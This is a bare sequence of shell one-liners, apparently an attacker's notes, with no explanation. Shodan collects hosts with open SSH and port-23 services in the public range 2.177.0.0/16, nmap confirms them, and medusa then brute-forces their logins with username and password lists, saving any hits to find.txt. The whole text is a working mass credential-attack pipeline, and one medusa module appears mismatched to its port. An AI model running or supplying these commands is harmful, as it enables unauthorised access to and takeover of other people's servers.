...
unzip fin.zip
base="2.177.0.0/16" ;shodan search --fields ip_str,port:22 ssh net:$base  | tee -a shodan22.txt  && sort shodan22.txt | awk '{$1=$1}1' | sed '/^$/d' >>  shodans22.txt &&  nmap -Pn -T5 --open -p 22 -iL "shodans22.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap22.txt"  && medusa -H "nmap22.txt" -U user1.txt -P ssh_pass.txt -M ssh  -n 22 -O "find.txt" -T 32
...
shodan search --fields ip_str,port:23  net:$base  | tee -a  shodan23.txt &&  sort shodan23.txt | awk '{$1=$1}1' | sed '/^$/d' >>   shodans23.txt  &&  nmap -Pn -T5 --open -p 23 -iL "shodans23.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap23.txt" &&  medusa -H "nmap23.txt" -U user1.txt -P p10.txt -M smbnt  -n  23 -O "find.txt" -T 32  